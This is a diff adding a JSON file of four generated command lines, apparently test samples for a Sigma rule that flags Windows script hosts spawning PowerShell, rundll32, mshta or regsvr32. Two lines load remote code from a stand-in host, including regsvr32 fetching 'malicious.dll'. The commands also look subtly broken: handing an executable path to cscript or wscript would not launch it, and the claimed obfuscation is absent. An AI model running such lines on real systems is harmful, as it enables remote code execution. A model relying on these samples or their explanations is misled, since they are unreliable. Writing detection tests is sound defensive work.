@@ -1,0 +1,18 @@
+[
+  {
+    "output": "cscript.exe //Nologo //E:VBScript \"C:\\\\Windows\\\\System32\\\\WScript.Shell\" Run \"powershell.exe -Command Get-Date\"",
+    "explanation": "This command simulates a suspicious child process (PowerShell) spawned by cscript.exe, which could trigger the Sigma rule. It uses insertion (quotes) and recoding (VBScript execution) to mimic obfuscation techniques."
+  },
+  {
+    "output": "wscript.exe \"C:\\\\Windows\\\\System32\\\\rundll32.exe\" url.dll,OpenURL http://example.com",
+    "explanation": "This command simulates a suspicious child process (rundll32.exe) spawned by wscript.exe, which could trigger the Sigma rule. It uses recoding and insertion to mimic obfuscation techniques."
+  },
+  {
+    "output": "cscript.exe //Nologo \"C:\\\\Windows\\\\System32\\\\mshta.exe\" http://example.com",
+    "explanation": "This command simulates a suspicious child process (mshta.exe) spawned by cscript.exe, which could trigger the Sigma rule. It uses recoding and insertion to mimic obfuscation techniques."
+  },
+  {
+    "output": "wscript.exe \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\" /s http://example.com\\malicious.dll",
+    "explanation": "This command simulates a suspicious child process (regsvr32.exe) spawned by wscript.exe, which could trigger the Sigma rule. It uses recoding and insertion to mimic obfuscation techniques."
+  }
+]
